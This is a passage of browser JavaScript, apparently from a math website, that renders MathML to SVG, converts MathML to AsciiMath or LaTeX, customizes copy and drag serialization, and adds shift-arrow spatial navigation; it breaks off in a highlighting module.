                context.translate(-sizes.width, 0);
                context.translate(-openWidth * scaleX, 0);
            }
        };
    };

    function isStretchyOperator(text) {
        return text === '(' || text === ')' || text === '{' || text === '}' || text === '|';
    }

    function isStretchy(node) {
        return node.tagName.toLowerCase() === 'mo' && isStretchyOperator(node.textContent);
    }

    var MATH_MROW = function(context, node, scriptlevel) {
        var baseline = 0;
        var width = 0;
        var height = 0;
        var childSizes = [];
        var child = node.firstElementChild;
        while (child != null) {
            var sizes = MathMLToSVG.measure(context, child, scriptlevel);
            baseline = Math.max(baseline, sizes.baseline);
            width += sizes.width;
            height = Math.max(height, sizes.height - sizes.baseline);
            var stretchy = isStretchy(child);
            childSizes.push({
                sizes: sizes,
                stretchy: stretchy
            });
            child = child.nextElementSibling;
        }

        var fontSize = MathMLToSVG.getFontSize(scriptlevel);
        var scaleY = (height + baseline) / fontSize;
        var scaleX = Math.sqrt(Math.sqrt(scaleY));
        for (var i = 0; i < childSizes.length; i += 1) {
            var sizes = childSizes[i].sizes;
            var stretchy = childSizes[i].stretchy;
            if (stretchy) {
                width += (scaleX - 1) * sizes.width;
            }
        }

        return {
            baseline: baseline,
            width: width,
            height: height + baseline,
            render: function() {
                var x = 0;
                for (var i = 0; i < childSizes.length; i += 1) {
                    var sizes = childSizes[i].sizes;
                    var stretchy = childSizes[i].stretchy;
                    var ay = height - (sizes.height - sizes.baseline);
                    context.translate(x, 0);
                    if (stretchy) {
                        context.scale(scaleX, scaleY);
                    } else {
                        context.translate(0, ay);
                    }
                    sizes.render();
                    if (stretchy) {
                        context.scale(1 / scaleX, 1 / scaleY);
                    } else {
                        context.translate(0, -ay);
                    }
                    context.translate(-x, 0);
                    if (stretchy) {
                        x += (scaleX - 1) * sizes.width;
                    }
                    x += sizes.width;
                }
            }
        };
    };

    MathMLToSVG.math = MATH_MROW;
    MathMLToSVG.mrow = MATH_MROW;
    MathMLToSVG.mtd = MATH_MROW;

    //TODO: REMOVE
    MathMLToSVG.mstyle = MATH_MROW;

    MathMLToSVG.mpadded = function(context, node, scriptlevel) {
        var fontSize = MathMLToSVG.getFontSize(scriptlevel);
        var width = Number.parseFloat(node.getAttribute("width")) * fontSize;
        var lspace = Number.parseFloat(node.getAttribute("lspace")) * fontSize;
        var sizes = MATH_MROW(context, node, scriptlevel);
        return {
            baseline: sizes.baseline,
            width: width + sizes.width,
            height: sizes.height,
            render: function() {
                context.translate(lspace, 0);
                sizes.render();
                context.translate(-lspace, 0);
            }
        };
    };

    MathMLToSVG.mfrac = function(context, node, scriptlevel) {
        var top = node.firstElementChild;
        var bottom = top.nextElementSibling;
        var topSizes = MathMLToSVG.measure(context, top, scriptlevel + 1);
        var bottomSizes = MathMLToSVG.measure(context, bottom, scriptlevel + 1);
        var width = Math.max(topSizes.width, bottomSizes.width);
        var height = 1 + topSizes.height + bottomSizes.height;
        var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
        return {
            baseline: 0.5 + bottomSizes.height - 0.5 * fontSize,
            width: width,
            height: height,
            render: function() {
                context.translate((width - topSizes.width) / 2, 0);
                topSizes.render();
                context.translate(-(width - topSizes.width) / 2, 0);

                var middle = topSizes.height - 0.5;
                context.beginPath();
                context.moveTo(0, middle);
                context.lineTo(width, middle);
                context.stroke();

                context.translate((width - bottomSizes.width) / 2, 1 + topSizes.height);
                bottomSizes.render();
                context.translate(-(width - bottomSizes.width) / 2, -1 - topSizes.height);
            }
        };
    };

    var MSUP_MSUB = function(context, node, scriptlevel) {
        var base = node.firstElementChild;
        var exponent = base.nextElementSibling;
        var baseSizes = MathMLToSVG.measure(context, base, scriptlevel);
        var exponentSizes = MathMLToSVG.measure(context, exponent, scriptlevel + 1);
        var width = baseSizes.width + exponentSizes.width;
        var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
        var height = baseSizes.height + exponentSizes.height - 0.5 * fontSize;
        var isMSUP = node.tagName.toLowerCase() === "msup";
        return {
            baseline: isMSUP ? 0 : 0.5 * fontSize,
            width: width,
            height: height,
            render: function() {
                if (isMSUP) {
                    context.translate(0, 0.5 * fontSize);
                }
                baseSizes.render();
                if (isMSUP) {
                    context.translate(0, -0.5 * fontSize);
                }
                if (!isMSUP) {
                    context.translate(0, baseSizes.height - 0.5 * fontSize);
                }
                context.translate(baseSizes.width, 0);
                exponentSizes.render();
                context.translate(-baseSizes.width, 0);
                if (!isMSUP) {
                    context.translate(0, -baseSizes.height + 0.5 * fontSize);
                }
            }
        };
    };

    MathMLToSVG.msup = MSUP_MSUB;
    MathMLToSVG.msub = MSUP_MSUB;

    MathMLToSVG.menclose = function(context, node, scriptlevel) {
        var sizes = MATH_MROW(context, node, scriptlevel); // 1*
        var notation = node.getAttribute("notation").split(" ");
        return {
            baseline: sizes.baseline,
            width: sizes.width,
            height: sizes.height,
            render: function() {
                sizes.render();
                var width = sizes.width;
                var height = sizes.height;
                for (var i = 0; i < notation.length; i += 1) {
                    var n = notation[i];
                    if (n !== "") {
                        context.beginPath();
                        if (n === "circle") {
                            context.ellipse(width / 2, height / 2, width / 2, height / 2, 0, 0, 2 * Math.PI, true);
                        } else if (n === "verticalstrike") {
                            context.moveTo(width / 2, 0);
                            context.lineTo(width / 2, height);
                        } else if (n === "horizontalstrike") {
                            context.moveTo(0, height / 2);
                            context.lineTo(width, height / 2);
                        }
                        context.stroke();
                    }
                }
            }
        };
    };

    var MSQRT_MROOT = function(context, node, scriptlevel) {
        var isMSQRT = node.tagName.toLowerCase() === "msqrt";
        var surd = "\u221A";
        var fontSize = MathMLToSVG.getFontSize(scriptlevel);
        var font = MathMLToSVG.makeFont("normal", node, fontSize);
        context.font = font;
        var surdWidth = context.measureText(surd).width;
        var h = 1;
        var base = isMSQRT ? node : node.firstElementChild;
        var index = isMSQRT ? undefined : base.nextElementSibling;
        // 1* for msqrt
        var baseSizes = isMSQRT ? MATH_MROW(context, base, scriptlevel) : MathMLToSVG.measure(context, base, scriptlevel);
        var indexSizes = isMSQRT ? undefined : MathMLToSVG.measure(context, index, scriptlevel + 2);
        return {
            baseline: baseSizes.baseline,
            width: baseSizes.width + surdWidth,
            height: baseSizes.height + h + 2,
            render: function() {
                context.translate(0, (baseSizes.height - fontSize) / 2 + 2);
                context.font = font;
                context.textBaseline = "middle";
                context.textAlign = "center";
                context.fillText(surd, surdWidth / 2, fontSize / 2);
                context.translate(0, -(baseSizes.height - fontSize) / 2 - 2);
                context.beginPath();
                context.moveTo(surdWidth, 0);
                context.lineTo(surdWidth + baseSizes.width, 0);
                context.stroke();
                context.translate(surdWidth, h + 2);
                baseSizes.render();
                context.translate(-surdWidth, -h - 2);
                if (!isMSQRT) {
                    context.translate(0, -0.25 * fontSize + 2);
                    indexSizes.render();
                    context.translate(0, 0.25 * fontSize - 2);
                }
            }
        };
    };

    MathMLToSVG.msqrt = MSQRT_MROOT;
    MathMLToSVG.mroot = MSQRT_MROOT;

    MathMLToSVG.munder = function(context, node, scriptlevel) {
        var first = node.firstElementChild;
        var second = first.nextElementSibling;
        var firstSizes = MathMLToSVG.measure(context, first, scriptlevel);
        var secondSizes = MathMLToSVG.measure(context, second, scriptlevel);
        var width = Math.max(firstSizes.width, secondSizes.width);
        var height = firstSizes.height + secondSizes.height;
        return {
            baseline: secondSizes.height,
            width: width,
            height: height,
            render: function() {
                context.translate((width - firstSizes.width) / 2, 0);
                firstSizes.render();
                context.translate(-(width - firstSizes.width) / 2, 0);
                context.translate(0, firstSizes.height);
                secondSizes.render();
                context.translate(0, -firstSizes.height);
            }
        };
    };

    //?
    MathMLToSVG.drawMathMLElement = function(element) {
        var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        var svgContext = new SVGRenderingContext2D(svg);
        var sizes = MathMLToSVG.measure(svgContext, element, 0);
        var width = sizes.width;
        var height = sizes.height;
        svg.setAttribute("width", width + "px");
        svg.setAttribute("height", height + "px");
        svg.setAttribute("viewBox", "0 0 " + width + " " + height);
        sizes.render();
        var data = (new XMLSerializer()).serializeToString(svg);
        var src = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(data);
        return {
            src: src,
            width: width,
            height: height
        };
    };

    globalThis.MathMLToSVG = MathMLToSVG;

}());


(function() {
    "use strict";

    //TODO:
    //? "≠": {replacement: "=", precedence: 2}

    var isRightToLeftAssociative = {
        ".^": true,
        "^": true
    };

    var operators = {
        "¯": {
            replacement: "*",
            precedence: 8
        },
        ",": {
            replacement: ",",
            precedence: -10
        }, //?
        "\u2192": {
            replacement: "->",
            precedence: -9
        }, //? &rarr;
        "\u2194": {
            replacement: "<->",
            precedence: -9
        }, //? &harr;
        ".^": {
            replacement: ".^",
            precedence: 7
        },
        "^": {
            replacement: "^",
            precedence: 6
        },
        "\u00D7": {
            replacement: "*",
            precedence: 5
        }, // &times;
        "\u22C5": {
            replacement: "*",
            precedence: 5
        }, // &sdot;
        "\u2061": {
            replacement: "",
            precedence: 6
        }, // &af;
        //TODO: ? cosx
        "\u2062": {
            replacement: "*",
            precedence: 5
        }, // &it;
        "\u2063": {
            replacement: ",",
            precedence: -10
        }, // &ic;
        "/": {
            replacement: "/",
            precedence: 5
        },
        "\u2215": {
            replacement: "/",
            precedence: 5
        },
        "\u2212": {
            replacement: "-",
            precedence: 3
        }, // &minus;
        "+": {
            replacement: "+",
            precedence: 2
        }
    };

    var brackets = {
        '(': true,
        '{': true,
        ')': true,
        '}': true,
        '|': true
    };

    var fence = function(x, operator, left, format) {
        return (x.precedence < operators[operator].precedence || (x.precedence === operators[operator].precedence && (left && isRightToLeftAssociative[operators[operator]] || !left && !isRightToLeftAssociative[operators[operator]]))) ? (format === "LaTeX" ? "\\left(" : "(") + x.string + (format === "LaTeX" ? "\\right)" : ")") : x.string;
    };

    var transformMTABLE = function(node, format) {
        function isStrikedRow(node) {
            return node.firstElementChild != null &&
                node.firstElementChild.tagName.toLowerCase() === 'mtd' &&
                node.firstElementChild.childElementCount === 1 &&
                node.firstElementChild.firstElementChild.tagName.toLowerCase() === 'menclose' &&
                (node.firstElementChild.firstElementChild.getAttribute('notation') === 'horizontalstrike' || (node.firstElementChild.firstElementChild.getAttribute('notation') || '').indexOf('horizontalstrike') !== -1); // TODO: remove
        }

        function isStrikedColumn(node) {
            return node.childElementCount === 1 &&
                node.firstElementChild.tagName.toLowerCase() === 'menclose' &&
                node.firstElementChild.getAttribute('notation') === 'verticalstrike';
        }
        var childNode = node.firstElementChild;
        var rows = "";
        rows += (format === "LaTeX" ? "\\begin{matrix}\n" : "{");
        var isFirstRow = true;
        while (childNode != undefined) {
            if (childNode.tagName.toLowerCase() === 'mtr' && !isStrikedRow(childNode)) {
                var c = childNode.firstElementChild;
                var row = "";
                while (c != undefined) {
                    if (c.tagName.toLowerCase() === 'mtd' && !isStrikedColumn(c)) {
                        row += (row !== "" ? (format === "LaTeX" ? " & " : ", ") : "") + fence(transformMathML(c, format), ",", true, format);
                    }
                    c = c.nextElementSibling;
                }
                rows += (!isFirstRow ? (format === "LaTeX" ? " \\\\\n" : ", ") : "") + (format === "LaTeX" ? "" : "{") + row + (format === "LaTeX" ? "" : "}");
                isFirstRow = false;
            }
            childNode = childNode.nextElementSibling;
        }
        rows += (format === "LaTeX" ? "\n\\end{matrix}" : "}");
        return rows; // "(" + ... + ")" ?
    };

    function TransformResult(string, precedence) {
        this.string = string;
        this.precedence = precedence;
    }

    //! This function is also used to convert copy-pasted mathml, so it may support more tags than produced by the site itself.
    var transformMathML = function(node, format, inferredMROW) {
        inferredMROW = inferredMROW != undefined ? inferredMROW : false;
        if (format !== "AsciiMath" && format !== "LaTeX") {
            throw new RangeError(format);
        }
        var tagName = inferredMROW ? "mrow" : node.tagName.toLowerCase();
        if (tagName === "math" ||
            tagName === "mtr" ||
            tagName === "mtd" ||
            tagName === "mrow" ||
            tagName === "mfenced" ||
            tagName === "menclose" ||
            tagName === "mpadded" ||
            tagName === "mstyle" ||
            tagName === "mo" ||
            tagName === "mi" ||
            tagName === "mn") {
            var s = "";
            var p = 42;
            if (tagName === "mi" || tagName === "mn" || tagName === "mo") {
                // Google Translate inserts <font> tags
                s = node.textContent;
            } else {
                var childNode = node.firstElementChild;
                while (childNode != undefined) {
                    var tmp = transformMathML(childNode, format);
                    s += tmp.string;
                    if (p > tmp.precedence) {
                        p = tmp.precedence;
                    }
                    childNode = childNode.nextElementSibling;
                }
            }
            if (node.firstElementChild != null && node.firstElementChild.tagName.toLowerCase() === 'mo' && brackets[node.firstElementChild.textContent] != null &&
                node.lastElementChild != null && node.lastElementChild.tagName.toLowerCase() === 'mo' && brackets[node.lastElementChild.textContent] != null) {
                if (format === "LaTeX") {
                    s = '\\left' + s.slice(0, -1) + '\\right' + s.slice(-1);
                }
                p = 42;
            }
            if (tagName === "mo") {
                var o = operators[s];
                var precedence = o == undefined ? 0 : o.precedence;
                if (p > precedence) {
                    p = precedence;
                }
                s = o == undefined ? s : o.replacement;
            }
            if (tagName === 'mi') {
                if (s === '\u2147') {
                    s = 'e';
                } else if (s === '\u2148') {
                    s = 'i';
                }
                if (format === "LaTeX") {
                    if (s.length === 1 && s.charCodeAt(0) >= 0x03B1 && s.charCodeAt(0) <= 0x03B1 + 24) {
                        var greek = " alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu nu xi omicron pi rho varsigma sigma tau upsilon phi chi psi omega ";
                        s = greek.split(' ')[s.charCodeAt(0) - 0x03B1 + 1];
                    }
                }
            }
            //TODO: fix
            if (tagName === "mi" && s.length > 1) {
                s = (format === "LaTeX" ? "\\" : "") + s;
            }
            //
            if (tagName === "mn" && s.indexOf(",") !== -1) {
                p = -10 - 1;
            }
            if (tagName === "mo" && s === "," && (node.getAttribute("rspace") != null || node.closest('msub') == null)) { //TODO: ?
                s += " ";
            }
            return tagName === "mfenced" ? new TransformResult((format === "LaTeX" ? "\\left" : "") + (node.getAttribute("open") || "(") + s + (format === "LaTeX" ? "\\right" : "") + (node.getAttribute("close") || ")"), 42) : new TransformResult(s, p);
        }
        if (tagName === "mover") {
            return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + fence(transformMathML(node.firstElementChild.nextElementSibling, format), "^", false, format), operators["^"].precedence);
        }
        if (tagName === "munder") {
            var tmp1 = transformMathML(node.firstElementChild, format);
            var tmp2 = transformMathML(node.firstElementChild.nextElementSibling, format);
            var s = tmp1.string;
            if (tmp2.string !== "") {
                if (s === "=" || s === "~" || s.length === 1) {
                    s = s + "[" + tmp2.string + "]" + s;
                } else {
                    s = s + "_(" + tmp2.string + ")";
                }
            }
            return new TransformResult(s, 42);
        }
        if (tagName === "munderover") {
            var tmp1 = transformMathML(node.firstElementChild, format);
            var tmp2 = transformMathML(node.firstElementChild.nextElementSibling, format);
            var tmp3 = transformMathML(node.firstElementChild.nextElementSibling.nextElementSibling, format);
            var s = '';
            s += tmp1.string;
            s += "_(" + tmp2.string + ")";
            s += "^(" + tmp3.string + ")";
            return new TransformResult(s, 42);
        }
        if (tagName === "msup") {
            return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + fence(transformMathML(node.firstElementChild.nextElementSibling, format), "^", false, format), operators["^"].precedence);
        }
        if (tagName === "msub") {
            //TODO: fix a_(1,2) ?
            var b = transformMathML(node.firstElementChild, format).string;
            var x = transformMathML(node.firstElementChild.nextElementSibling, format).string;
            return new TransformResult(b + "_" + (format === "LaTeX" ? (x.length > 1 ? '{' + x + '}' : x) : (x.indexOf(",") !== -1 ? "(" + x + ")" : x)), 42); // "(" + ... + ")" ?
        }
        if (tagName === "mfrac") {
            var n = transformMathML(node.firstElementChild, format);
            var d = transformMathML(node.firstElementChild.nextElementSibling, format);
            if (format === "LaTeX") {
                return new TransformResult("\\frac" + "{" + n.string + "}" + "{" + d.string + "}", 42);
            }
            // https://www.unicode.org/notes/tn28/UTN28-PlainTextMath-v3.1.pdf
            return new TransformResult(fence(n, "/", true, format) + (node.getAttribute("linethickness") === "0" ? "¦" : "/") + fence(d, "/", false, format), operators["/"].precedence);
        }
        if (tagName === "msqrt") {
            return new TransformResult((format === "LaTeX" ? "\\" : "") + "sqrt" + (format === "LaTeX" ? "{" : "(") + transformMathML(node, format, true).string + (format === "LaTeX" ? "}" : ")"), 42);
        }
        if (tagName === "mroot") {
            return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + "(" + "1" + "/" + transformMathML(node.firstElementChild.nextElementSibling, format).string + ")", operators["^"].precedence);
        }
        if (tagName === "mtable") {
            return new TransformResult(transformMTABLE(node, format), 42);
        }
        if (tagName === "mtext") { //?
            //return new TransformResult("", 42);
            var length = 0;
            var child = node.firstChild;
            while (child != null) {
                length += 1;
                child = child.nextSibling;
            }
            var range = {
                startContainer: node,
                startOffset: 0,
                endContainer: node,
                endOffset: length,
                commonAncestorContainer: node
            };
            var ss = globalThis.serializeAsPlainText(range);
            ss = ss.trim();
            if (ss === "(?)" || ss === "?") { //TODO: ?
                ss = "";
            }
            return new TransformResult(ss === "" ? "" : (format === "LaTeX" ? "text(" : "\"") + ss + (format === "LaTeX" ? ")" : "\""), 42);
        }
        if (tagName === "maction") {
            console.info('only first child is handled for <maction>');
            return transformMathML(node.firstElementChild, format);
        }
        if (tagName === "mspace") {
            console.info('ignore <mspace>');
            return new TransformResult("", 42);
        }
        throw new TypeError("transformMathML:" + tagName);
    };

    globalThis.transformMathML = transformMathML;

}());

/*global window, document, Node, XMLSerializer, transformMathML */

(function() {
    "use strict";

    var isBlock = function(display) {
        switch (display) {
            case "inline":
            case "inline-block":
            case "inline-flex":
            case "inline-grid":
            case "inline-table":
            case "none":
            case "table-column":
            case "table-column-group":
            case "table-cell":
                return false;
        }
        return true;
    };

    var getNodeLength = function(container) {
        if (container.nodeType === Node.TEXT_NODE) {
            return container.data.length;
        }
        if (container.nodeType === Node.ELEMENT_NODE) {
            var count = 0;
            var child = container.firstChild;
            while (child != null) {
                child = child.nextSibling;
                count += 1;
            }
            return count;
        }
        return undefined;
    };

    var isBoundaryPoint = function(container, offset, which, node) {
        if (which === "end" && offset !== getNodeLength(container) || which === "start" && offset !== 0) {
            return false;
        }
        for (var x = container; x !== node; x = x.parentNode) {
            var y = which === "end" ? x.nextSibling : (which === "start" ? x.previousSibling : null);
            // https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Whitespace#Whitespace_helper_functions
            while (y != null && y.nodeType !== Node.ELEMENT_NODE && (y.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(y.data))) {
                y = which === "end" ? y.nextSibling : (which === "start" ? y.previousSibling : null);
            }
            if (y != null) {
                return false;
            }
        }
        return true;
    };

    var getChildNode = function(container, offset, which, node) {
        var child = null;
        var x = container;
        while (x !== node) {
            child = x;
            x = x.parentNode;
        }
        if (child != null) {
            child = which === "end" ? child.nextSibling : (which === "start" ? child : null);
        } else {
            var i = -1;
            child = container.firstChild; // node === container
            while (++i < offset) {
                child = child.nextSibling;
            }
        }
        return child;
    };

    var serialize = function(range, isLineStart) {
        // big thanks to everyone
        // see https://github.com/timdown/rangy/blob/master/src/modules/rangy-textrange.js
        // see https://github.com/WebKit/webkit/blob/ec2f4d46b97bb20fd0877b1f4b5ec50f7b9ec521/Source/WebCore/editing/TextIterator.cpp#L1188
        // see https://github.com/jackcviers/Rangy/blob/master/spec/innerText.htm

        var node = range.commonAncestorContainer;
        var startContainer = range.startContainer;
        var startOffset = range.startOffset;
        var endContainer = range.endContainer;
        var endOffset = range.endOffset;

        if (node.nodeType === Node.TEXT_NODE) {
            if (node !== startContainer || node !== endContainer) {
                throw new TypeError();
            }
            var data = node.data.slice(startOffset, endOffset);
            var whiteSpace = window.getComputedStyle(node.parentNode, null).whiteSpace;
            if (whiteSpace !== 'pre') {
                data = data.replace(/[\t\n\f\r\u0020]+/g, " ");
                if (isLineStart) {
                    data = data.replace(/^[\t\n\f\r\u0020]/g, "");
                }
            }
            return data;
        }
        if (node.nodeType === Node.ELEMENT_NODE) {
            var display = window.getComputedStyle(node, null).display;
            if (display === "none") {
                return "";
            }
            var result = "";
            if (isBlock(display) && !isLineStart) {
                result += "\n";
                isLineStart = true;
            }
            var x = undefined;
            if (isBoundaryPoint(startContainer, startOffset, "start", node) &&
                isBoundaryPoint(endContainer, endOffset, "end", node)) {
                var tagName = node.tagName.toLowerCase();
                if (tagName === "math" || (tagName !== "mtext" && node.namespaceURI === "http://www.w3.org/1998/Math/MathML")) {
                    x = transformMathML(node, "AsciiMath").string;
                }
                if (tagName === "br") {
                    x = "\n";
                }
            }
            if (x != undefined) {
                result += x;
            } else {
                var startChildNode = getChildNode(startContainer, startOffset, "start", node);
                var endChildNode = getChildNode(endContainer, endOffset, "end", node);
                var childNode = startChildNode;
                while (childNode !== endChildNode) {
                    var childNodeRange = {
                        startContainer: childNode === startChildNode && startContainer !== node ? startContainer : childNode,
                        startOffset: childNode === startChildNode && startContainer !== node ? startOffset : 0,
                        endContainer: childNode.nextSibling === endChildNode && endContainer !== node ? endContainer : childNode,
                        endOffset: childNode.nextSibling === endChildNode && endContainer !== node ? endOffset : getNodeLength(childNode),
                        commonAncestorContainer: childNode
                    };
                    var y = serialize(childNodeRange, isLineStart);
                    isLineStart = y === "" && isLineStart || y.slice(-1) === "\n";
                    result += y;
                    childNode = childNode.nextSibling;
                }
            }
            if (display === "table-cell") {
                result += "\t";
            }
            if (isBlock(display) && !isLineStart) {
                result = result.replace(/[\t\n\f\r\u0020]$/g, "");
                result += "\n";
                isLineStart = true;
            }
            return result;
        }
        return "";
    };

    var serializeAsPlainText = function(range) {
        var isLineStart = range.startContainer.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(range.startContainer.data.slice(0, range.startOffset));
        var isLineEnd = range.endContainer.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(range.endContainer.data.slice(range.endOffset));
        var staticRange = {
            startContainer: range.startContainer,
            startOffset: range.startOffset,
            endContainer: range.endContainer,
            endOffset: range.endOffset,
            commonAncestorContainer: range.commonAncestorContainer
        };
        var value = serialize(staticRange, false);
        if (isLineStart) {
            value = value.replace(/^[\t\n\f\r\u0020]/g, "");
        }
        if (isLineEnd) {
            value = value.replace(/[\t\n\f\r\u0020]$/g, "");
        }
        return value;
    };

    var serializeAsHTML = function(range) {
        var fragment = range.cloneContents();
        if (range.commonAncestorContainer.nodeType === Node.ELEMENT_NODE && range.commonAncestorContainer.namespaceURI === "http://www.w3.org/1998/Math/MathML") { //?
            var math = document.createElementNS("http://www.w3.org/1998/Math/MathML", "math");
            math.appendChild(fragment);
            fragment = math;
        }
        return new XMLSerializer().serializeToString(fragment); // to have the xmlns for <math> elements
    };

    var onCopyOrDragStart = function(event) {
        var dataTransfer = event.type === "copy" ? event.clipboardData : event.dataTransfer;
        var tagName = event.target.nodeType === Node.ELEMENT_NODE ? event.target.tagName.toLowerCase() : "";
        if (tagName !== "input" && tagName !== "textarea" && (tagName !== "a" || event.type === "copy") && tagName !== "img") {
            //! dataTransfer.effectAllowed throws an exception in FireFox if tagName is INPUT or TEXTAREA
            if ((event.type === "copy" || dataTransfer.effectAllowed === "uninitialized") && !event.defaultPrevented) {
                var selection = window.getSelection();
                var rangeCount = selection.rangeCount;
                if (rangeCount !== 0 && !selection.isCollapsed) {
                    var i = -1;
                    var plainText = "";
                    var htmlText = "";
                    while (++i < rangeCount) {
                        //TODO: Firefox makes multiple selection when some <button> elements are selected ...
                        var range = selection.getRangeAt(i);
                        htmlText += serializeAsHTML(range);
                        plainText += serializeAsPlainText(range);
                    }
                    // see also https://github.com/w3c/clipboard-apis/issues/48
                    dataTransfer.setData("text/html", htmlText);
                    dataTransfer.setData("text/plain", plainText);
                    if (event.type === "copy") {
                        event.preventDefault();
                    } else {
                        dataTransfer.effectAllowed = "copy";
                    }
                }
            }
        }
    };

    if (typeof document !== "undefined") {
        document.addEventListener("copy", onCopyOrDragStart, false);
        document.addEventListener("dragstart", onCopyOrDragStart, false);
    }

    //!
    // rangeInnerText
    //globalThis.serializeAsHTML = serializeAsHTML;
    globalThis.serializeAsPlainText = serializeAsPlainText;

}());


// based on https://github.com/WICG/spatial-navigation/blob/main/polyfill/spatial-navigation-polyfill.js

/*
  option.mode = 'all'; //!!!TODO: ?
  if (element.tagName.toLowerCase() === 'iframe') {
    return false;
  }
  // https://github.com/WICG/spatial-navigation/pull/228/files
  window.__spatialNavigation__.keyMode = "SHIFTARROW";
*/

if (!('navigate' in window)) {

    if (Element.prototype.checkVisibility == null) {
        // IE 11
        Element.prototype.checkVisibility = function() {
            //TODO: fix
            return e.offsetWidth !== 0 || e.offsetHeight !== 0 || e.getClientRects().length !== 0;
        };
    }

    var isVisible = function(element) {
        return element.checkVisibility();
    };
    var directions = {
        37: 'left',
        38: 'top',
        39: 'right',
        40: 'bottom'
    };
    var exitPoint = function(rect, direction) {
        return {
            x: direction === 'left' || direction === 'right' ? rect[direction] : (rect.left + rect.right) / 2,
            y: direction === 'top' || direction === 'bottom' ? rect[direction] : (rect.top + rect.bottom) / 2
        };
    };
    var distance = function(to, from, f) {
        return Math.sqrt(Math.pow((to.x - from.x) * (f ? 2 : 1), 2) + Math.pow((to.y - from.y) * (!f ? 2 : 1), 2));
    };
    var distance1 = function(fromRect, toRect, direction) {
        var f = direction === 'bottom' || direction === 'top';
        var P1 = exitPoint(fromRect, direction);
        var P2 = {
            x: Math.min(Math.max(P1.x, toRect.left), toRect.right),
            y: Math.min(Math.max(P1.y, toRect.top), toRect.bottom)
        };
        return distance(P1, P2, f);
    };
    var handlingEditableElementSmall = function(input, direction) {
        // input.selectionStart == null && input.selectionEnd == null for <input type="number" />
        var tagName = input.tagName.toLowerCase();
        return (tagName !== 'input' && tagName !== 'textarea' && tagName !== 'custom-input') ||
            (input.selectionStart === input.selectionEnd && (input.selectionStart == null || input.selectionStart === (direction === 'left' || direction === 'up' ? 0 : input.value.length)));
    };

    var canMove = function(direction) {
        // The method is based on the Selection#modify
        var selection = window.getSelection();
        var compareCaretPositons = function(node1, offset1, node2, offset2) {
            var tmpRange1 = document.createRange();
            tmpRange1.setStart(node1, offset1);
            var tmpRange2 = document.createRange();
            tmpRange2.setStart(node2, offset2);
            return tmpRange1.compareBoundaryPoints(Range.START_TO_START, tmpRange2);
        };
        var anchorNode = selection.anchorNode;
        var anchorOffset = selection.anchorOffset;
        var focusNode = selection.focusNode;
        var focusOffset = selection.focusOffset;
        var forward = compareCaretPositons(anchorNode, anchorOffset, focusNode, focusOffset) < 0;
        var node = null;
        var offset = 0;
        if (direction === 'backward') {
            node = forward ? anchorNode : focusNode;
            offset = forward ? anchorOffset : focusOffset;
        }
        if (direction === 'forward') {
            node = forward ? focusNode : anchorNode;
            offset = forward ? focusOffset : anchorOffset;
        }
        selection.setBaseAndExtent(node, offset, node, offset);
        selection.modify('move', direction, 'character');
        var result = selection.anchorNode !== node ||
            selection.anchorOffset !== offset ||
            selection.focusNode !== node ||
            selection.focusOffset !== offset;
        selection.setBaseAndExtent(anchorNode, anchorOffset, focusNode, focusOffset);
        return result;
    };

    document.addEventListener('keydown', function(event) {
        if (!event.defaultPrevented && event.shiftKey && !event.ctrlKey && !event.metaKey && !event.altKey) {
            var direction = directions[event.keyCode] || '';
            //TODO: check selectable elements, check "caret browsing state"
            if (direction !== '') {

                //TODO: create issues in the WICG/spatial-navigation :
                if (!window.getSelection().isCollapsed) {
                    return; //TODO: issue - ?
                }
                var tagName = event.target.tagName.toLowerCase();
                var isEditable = tagName === 'input' || tagName === 'textarea' || tagName === 'custom-input' || event.target.hasAttribute('contenteditable');
                if (!isEditable && document.activeElement.contains(window.getSelection().focusNode)) {
                    if (window.getSelection().type === 'Caret') {
                        // no way to detect "Caret Navigation" mode in Chrome :-(, so just use same handlign as for editable elements
                        if ((direction === 'left' || direction === 'up' ? canMove('backward') : canMove('forward'))) {
                            return; //TODO: issue - ?
                        }
                    }
                }
                if (!handlingEditableElementSmall(document.activeElement, direction)) {
                    return;
                }

                var from = document.activeElement;
                var fromRect = from.getBoundingClientRect();
                var elements = document.getElementsByTagName('*');
                var to = null;
                var toRect = null;
                for (var i = 0; i < elements.length; i++) {
                    var element = elements[i];
                    if (element.hasAttribute('tabindex') || element.tabIndex !== -1) {
                        var rect = element.getBoundingClientRect();
                        if (direction === 'bottom' && rect.bottom > fromRect.bottom || direction === 'top' && rect.top < fromRect.top || direction === 'left' && rect.left < fromRect.left || direction === 'right' && rect.right > fromRect.right) {
                            if (toRect == null || distance1(fromRect, toRect, direction) >
                                distance1(fromRect, rect, direction)) {
                                if (isVisible(element)) {
                                    to = element;
                                    toRect = rect;
                                }
                            }
                        }
                    }
                }
                if (to != null) {
                    event.preventDefault();
                    to.focus();
                }
            }
        }
    }, false);
}

/*global document, Dialog */

(function() {
    "use strict";

    var oldHighlights = undefined;
    var highlight = function(element) {
        if (oldHighlights != undefined) {
            for (var i = 0; i < oldHighlights.length; i += 1) {
                var t = document.getElementById(oldHighlights[i]);
                if (t != undefined) {
                    t.removeAttribute("mathbackground");
                    t.removeAttribute("mathcolor");
                }
            }
            oldHighlights = undefined;
        }
        if (element != undefined) {
            var highlight = element.getAttribute("data-highlight"); // #id1, #id2, ...
            if (highlight != undefined) {
                var newHighlights = highlight.replace(/[#\s]/g, "").split(",");
                for (var j = 0; j < newHighlights.length; j += 1) {
                    var e = document.getElementById(newHighlights[j]);
                    if (e != undefined) {
                        e.setAttribute("mathbackground", "#FAEBD7");
                        e.setAttribute("mathcolor", "#3C78C2");
                    }
                }
                oldHighlights = newHighlights;
            }
        }
    };

    var tooltip = null;

    var keyDownTarget = undefined;

    var onKeyDown = function(event) {
        var DOM_VK_ESCAPE = 27;
